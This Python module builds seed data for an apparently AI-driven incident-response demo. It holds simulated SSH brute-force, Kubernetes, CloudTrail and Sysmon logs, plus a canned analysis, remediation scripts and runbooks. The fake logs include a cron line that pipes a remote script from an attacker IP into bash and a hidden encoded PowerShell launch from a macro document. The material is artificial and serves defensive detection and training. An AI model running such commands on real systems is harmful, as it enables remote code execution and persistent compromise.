"""Realistic seed data for the demo environment.

These render as raw log files (exactly what a real operator would upload), so the
demo exercises the true parsing/detection/normalization path — nothing is faked
at the event level. A pre-baked analysis and knowledge-base articles are included
so the demo is populated even before the visitor runs the AI themselves."""

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta


@dataclass
class DemoFile:
    filename: str
    content: str
    # Optional canned analysis so the upload shows a completed result immediately.
    analysis: dict | None = None


@dataclass
class DemoDoc:
    title: str
    doc_type: str
    text: str


@dataclass
class DemoConversation:
    title: str
    messages: list[tuple[str, str]] = field(default_factory=list)  # (role, content)


_BASE = datetime(2026, 6, 14, 2, 11, 0, tzinfo=UTC)


def _ts(offset_seconds: int) -> str:
    """RFC3164-style syslog timestamp (no year), offset from the incident start."""
    return (_BASE + timedelta(seconds=offset_seconds)).strftime("%b %e %H:%M:%S")


def _ssh_bruteforce_log() -> str:
    """Linux auth.log: SSH brute force from one IP, then a successful root login,
    then persistence (new sudo user + cron)."""
    ip = "45.146.164.110"
    lines: list[str] = []
    for i in range(60):
        lines.append(
            f"{_ts(i * 3)} web-prod-01 sshd[{2200 + i}]: Failed password for "
            f"{'root' if i % 2 else 'invalid user admin'} from {ip} port {40000 + i} ssh2"
        )
    lines += [
        f"{_ts(185)} web-prod-01 sshd[2400]: Accepted password for root from {ip} port 40210 ssh2",
        f"{_ts(186)} web-prod-01 sshd[2400]: pam_unix(sshd:session): session opened for user root",
        f"{_ts(190)} web-prod-01 useradd[2455]: new user: name=svc-backup, UID=0, GID=0, "
        "home=/home/svc-backup, shell=/bin/bash",
        f"{_ts(191)} web-prod-01 passwd[2456]: password for 'svc-backup' changed by 'root'",
        f"{_ts(205)} web-prod-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; "
        "COMMAND=/usr/bin/crontab -l",
        f"{_ts(206)} web-prod-01 CRON[2501]: (root) CMD (curl -s http://{ip}/x.sh | bash)",
        f"{_ts(240)} web-prod-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC={ip} DST=10.0.3.11 "
        "PROTO=TCP DPT=4444",
    ]
    return "\n".join(lines) + "\n"


def _k8s_events_json() -> str:
    """Kubernetes events (events.k8s.io shape): an OOMKilled crashloop taking down
    the checkout service, plus failed scheduling from resource pressure."""
    import json

    def evt(reason, kind, name, ns, msg, etype, count, minute):
        t = (_BASE + timedelta(minutes=minute)).strftime("%Y-%m-%dT%H:%M:%SZ")
        return {
            "kind": "Event",
            "type": etype,
            "reason": reason,
            "note": msg,
            "regarding": {"kind": kind, "name": name, "namespace": ns},
            "deprecatedFirstTimestamp": t,
            "deprecatedLastTimestamp": t,
            "deprecatedCount": count,
            "reportingController": "kubelet",
        }

    events = [
        evt("Scheduled", "Pod", "checkout-7d9f-abc", "shop", "Successfully assigned shop/checkout to node-3", "Normal", 1, 0),
        evt("Pulled", "Pod", "checkout-7d9f-abc", "shop", "Container image 'checkout:1.9.2' already present on machine", "Normal", 1, 0),
        evt("Started", "Pod", "checkout-7d9f-abc", "shop", "Started container checkout", "Normal", 1, 1),
        evt("OOMKilling", "Pod", "checkout-7d9f-abc", "shop", "Memory cgroup out of memory: Killed process 2731 (java) total-vm:4200100kB", "Warning", 1, 6),
        evt("BackOff", "Pod", "checkout-7d9f-abc", "shop", "Back-off restarting failed container checkout in pod checkout-7d9f-abc", "Warning", 23, 9),
        evt("Unhealthy", "Pod", "checkout-7d9f-abc", "shop", "Readiness probe failed: HTTP probe failed with statuscode: 503", "Warning", 41, 10),
        evt("FailedScheduling", "Pod", "checkout-7d9f-def", "shop", "0/4 nodes are available: 3 Insufficient memory, 1 node(s) had untolerated taint", "Warning", 12, 11),
        evt("SuccessfulRescale", "HorizontalPodAutoscaler", "checkout", "shop", "New size: 6; reason: memory resource utilization above target", "Normal", 1, 12),
    ]
    return json.dumps(events, indent=2)


def _cloudtrail_json() -> str:
    """AWS CloudTrail: leaked access key doing recon + persistence + exfil attempt."""
    import json

    def rec(name, source, minute, error=None, extra=None):
        base = {
            "eventVersion": "1.09",
            "eventTime": (_BASE + timedelta(minutes=minute)).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "eventSource": source,
            "eventName": name,
            "awsRegion": "us-east-1",
            "sourceIPAddress": "45.146.164.110",
            "userAgent": "aws-cli/2.15.0 Python/3.11",
            "userIdentity": {
                "type": "IAMUser",
                "arn": "arn:aws:iam::481516234200:user/ci-deploy",
                "userName": "ci-deploy",
                "accessKeyId": "AKIAIOSFODNN7EXAMPLE",
            },
            "readOnly": error is None and name.startswith(("Get", "List", "Describe")),
        }
        if error:
            base["errorCode"] = error
            base["errorMessage"] = f"User is not authorized to perform {name}"
        if extra:
            base.update(extra)
        return base

    records = [
        rec("GetCallerIdentity", "sts.amazonaws.com", 0),
        rec("ListBuckets", "s3.amazonaws.com", 1),
        rec("ListUsers", "iam.amazonaws.com", 1),
        rec("ListAccessKeys", "iam.amazonaws.com", 2),
        rec("CreateAccessKey", "iam.amazonaws.com", 3),
        rec("AttachUserPolicy", "iam.amazonaws.com", 3, error="AccessDenied"),
        rec("PutUserPolicy", "iam.amazonaws.com", 4),
        rec("GetObject", "s3.amazonaws.com", 6, extra={"requestParameters": {"bucketName": "acme-customer-pii"}}),
        rec("DeleteTrail", "cloudtrail.amazonaws.com", 7, error="AccessDenied"),
    ]
    return json.dumps({"Records": records}, indent=2)


def _sysmon_xml() -> str:
    """Sysmon operational events (EVTX-style XML): suspicious PowerShell spawned from
    Office, encoded command, outbound C2, and a Run-key persistence write."""
    def event(eid, provider, computer, minute, data: dict):
        t = (_BASE + timedelta(minutes=minute)).strftime("%Y-%m-%dT%H:%M:%SZ")
        data_xml = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
        return (
            "<Event>"
            "<System>"
            f'<Provider Name="{provider}"/>'
            f"<EventID>{eid}</EventID><Level>4</Level>"
            f'<TimeCreated SystemTime="{t}"/>'
            f"<Computer>{computer}</Computer>"
            "<Channel>Microsoft-Windows-Sysmon/Operational</Channel>"
            "</System>"
            f"<EventData>{data_xml}</EventData>"
            "</Event>"
        )

    provider = "Microsoft-Windows-Sysmon"
    host = "FIN-WKS-24.corp.acme.local"
    events = [
        event(1, provider, host, 0, {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -nop -w hidden -enc "
                           "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...",
            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "ParentCommandLine": "WINWORD.EXE /n Invoice_4471.docm",
            "User": "CORP\\jdoe",
        }),
        event(3, provider, host, 1, {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "DestinationIp": "45.146.164.110",
            "DestinationPort": "443",
            "DestinationHostname": "cdn-status-check.info",
            "Protocol": "tcp",
        }),
        event(11, provider, host, 1, {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "TargetFilename": "C:\\Users\\jdoe\\AppData\\Roaming\\svchost.exe",
        }),
        event(13, provider, host, 2, {
            "Image": "C:\\Windows\\System32\\reg.exe",
            "TargetObject": "HKU\\...\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
            "Details": "C:\\Users\\jdoe\\AppData\\Roaming\\svchost.exe",
        }),
        event(22, provider, host, 2, {
            "Image": "C:\\Users\\jdoe\\AppData\\Roaming\\svchost.exe",
            "QueryName": "cdn-status-check.info",
            "QueryResults": "45.146.164.110",
        }),
    ]
    return "<Events>" + "".join(events) + "</Events>"


# ---- Pre-baked analysis for the SSH brute-force file (shown as completed) -------

_SSH_ANALYSIS = {
    "summary": (
        "web-prod-01 was compromised via SSH password brute force from 45.146.164.110. "
        "After ~60 failed attempts the attacker logged in as root and established "
        "persistence by creating a UID-0 user (svc-backup) and a root cron job that pulls "
        "and executes a remote script."
    ),
    "root_cause": (
        "Password authentication was enabled for root over SSH with no rate limiting or "
        "IP allow-listing, allowing an unauthenticated brute-force attack to succeed. The "
        "successful login at 02:14:05 from the same IP that generated all prior failures, "
        "immediately followed by user and cron creation, confirms account takeover rather "
        "than legitimate administration."
    ),
    "severity": "critical",
    "confidence": 0.93,
    "affected_systems": [
        {"name": "web-prod-01", "role": "Production web server (10.0.3.11)",
         "evidence": "Target of the brute force and the successful root login; persistence artifacts created here."},
        {"name": "svc-backup", "role": "Attacker-created UID-0 account",
         "evidence": "useradd with UID=0 at 02:14:10, 4s after the successful login."},
    ],
    "remediation": [
        {"step": 1, "action": "Isolate web-prod-01 from the network and snapshot it for forensics before remediation.",
         "rationale": "Preserves evidence and stops active C2 (blocked outbound to :4444 already observed)."},
        {"step": 2, "action": "Delete the svc-backup account and remove the malicious root crontab entry (curl … | bash).",
         "rationale": "Removes the two persistence mechanisms the attacker installed."},
        {"step": 3, "action": "Rotate all credentials and secrets stored on the host; assume they are compromised.",
         "rationale": "Root access means every secret on the box must be considered exposed."},
        {"step": 4, "action": "Disable SSH password auth and root login; enforce key-based auth and fail2ban / IP allow-listing.",
         "rationale": "Closes the root cause so the attack cannot recur."},
    ],
    "scripts": {
        "bash": "#!/usr/bin/env bash\nset -euo pipefail\n# Remediate web-prod-01 after SSH compromise\n"
                "# 1) Remove attacker persistence\nuserdel -r svc-backup 2>/dev/null || true\n"
                "crontab -l | grep -v 'x.sh' | crontab -\n"
                "# 2) Block the source IP\nufw deny from 45.146.164.110\n"
                "# 3) Harden sshd\nsed -i 's/^#\\?PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config\n"
                "sed -i 's/^#\\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config\n"
                "systemctl restart ssh\n",
        "ansible": "---\n- name: Harden SSH on web servers\n  hosts: web\n  become: true\n  tasks:\n"
                   "    - name: Disable root login\n      ansible.builtin.lineinfile:\n"
                   "        path: /etc/ssh/sshd_config\n        regexp: '^#?PermitRootLogin'\n"
                   "        line: 'PermitRootLogin no'\n    - name: Disable password auth\n"
                   "      ansible.builtin.lineinfile:\n        path: /etc/ssh/sshd_config\n"
                   "        regexp: '^#?PasswordAuthentication'\n        line: 'PasswordAuthentication no'\n"
                   "      notify: restart ssh\n  handlers:\n    - name: restart ssh\n"
                   "      ansible.builtin.service:\n        name: ssh\n        state: restarted\n",
        "powershell": "",
        "terraform": "",
    },
    "evidence": [
        "60 'Failed password ... from 45.146.164.110' events between 02:11:00 and 02:14:00",
        "02:14:05 'Accepted password for root from 45.146.164.110'",
        "02:14:10 useradd: new user: name=svc-backup, UID=0, GID=0",
        "02:14:26 CRON (root) CMD (curl -s http://45.146.164.110/x.sh | bash)",
        "Alternative hypothesis: legitimate admin activity — rejected because the successful "
        "login originated from the same IP as the brute-force failures and was followed by covert persistence.",
    ],
}


def demo_files() -> list[DemoFile]:
    return [
        DemoFile("web-prod-01_auth.log", _ssh_bruteforce_log(), analysis=_SSH_ANALYSIS),
        DemoFile("k8s-shop-events.json", _k8s_events_json()),
        DemoFile("cloudtrail-us-east-1.json", _cloudtrail_json()),
        DemoFile("FIN-WKS-24_sysmon.xml", _sysmon_xml()),
    ]


def demo_docs() -> list[DemoDoc]:
    return [
        DemoDoc(
            "Runbook: SSH brute-force / compromised host",
            "runbook",
            "# SSH Brute-Force Response Runbook\n\n"
            "## Detection\n"
            "- Spike of `Failed password` in /var/log/auth.log from a single source IP.\n"
            "- An `Accepted password`/`Accepted publickey` from that same IP is a takeover signal.\n\n"
            "## Diagnosis\n"
            "1. `grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn`\n"
            "2. Check for new users: `awk -F: '$3==0 {print}' /etc/passwd` (any UID 0 besides root is bad).\n"
            "3. Inspect crontabs: `for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u $u 2>/dev/null; done`\n\n"
            "## Remediation\n"
            "- Isolate host, snapshot for forensics, remove persistence, rotate all secrets.\n"
            "- Set `PermitRootLogin no` and `PasswordAuthentication no`; deploy fail2ban.\n\n"
            "## Escalation\n"
            "Page the on-call security lead if a successful login followed the brute force.",
        ),
        DemoDoc(
            "Runbook: Kubernetes OOMKilled / CrashLoopBackOff",
            "runbook",
            "# OOMKilled & CrashLoopBackOff Runbook\n\n"
            "## Detection\n"
            "- `Warning OOMKilling` and repeated `BackOff` events on a pod.\n"
            "- Readiness probe 503s while the container restarts.\n\n"
            "## Diagnosis\n"
            "1. `kubectl describe pod <pod> -n <ns>` — look at Last State: OOMKilled and restart count.\n"
            "2. `kubectl top pod -n <ns>` — compare usage to limits.\n"
            "3. Check for a memory leak or an under-provisioned `resources.limits.memory`.\n\n"
            "## Remediation\n"
            "- Raise the memory limit or fix the leak; add an HPA on memory if load-driven.\n"
            "- If FailedScheduling from Insufficient memory, add nodes or right-size requests.",
        ),
        DemoDoc(
            "Standard: Production incident severities",
            "documentation",
            "# Incident Severity Definitions\n\n"
            "- **Critical (SEV1):** confirmed compromise, data exposure, or full outage of a "
            "customer-facing service. Page immediately.\n"
            "- **High (SEV2):** partial outage or degraded service with customer impact.\n"
            "- **Medium (SEV3):** internal impact, no customer effect, workaround exists.\n"
            "- **Low (SEV4):** cosmetic or informational.",
        ),
    ]


def demo_conversation() -> DemoConversation:
    return DemoConversation(
        title="Welcome to OpsPilot",
        messages=[
            ("user", "What can you do?"),
            (
                "assistant",
                "Welcome to the **OpsPilot AI** demo environment 👋\n\n"
                "This sandbox is pre-loaded with real infrastructure logs from a simulated "
                "incident. Try these:\n\n"
                "- Open **Log Uploads** and browse `web-prod-01_auth.log` — I've already "
                "analyzed it; check **Analyses** for the root cause, affected systems, "
                "remediation plan and generated Bash/Ansible.\n"
                "- Upload one of the other seeded files (`k8s-shop-events.json`, "
                "`cloudtrail-us-east-1.json`, `FIN-WKS-24_sysmon.xml`) and click **Analyze with AI**.\n"
                "- Ask me things like *\"explain the CloudTrail activity\"* or *\"is the Sysmon "
                "PowerShell malicious?\"* — I'll reason over the logs and the runbooks in the "
                "**Knowledge Base**.\n\n"
                "Everything here is yours alone and resets when your session ends.",
            ),
        ],
    )
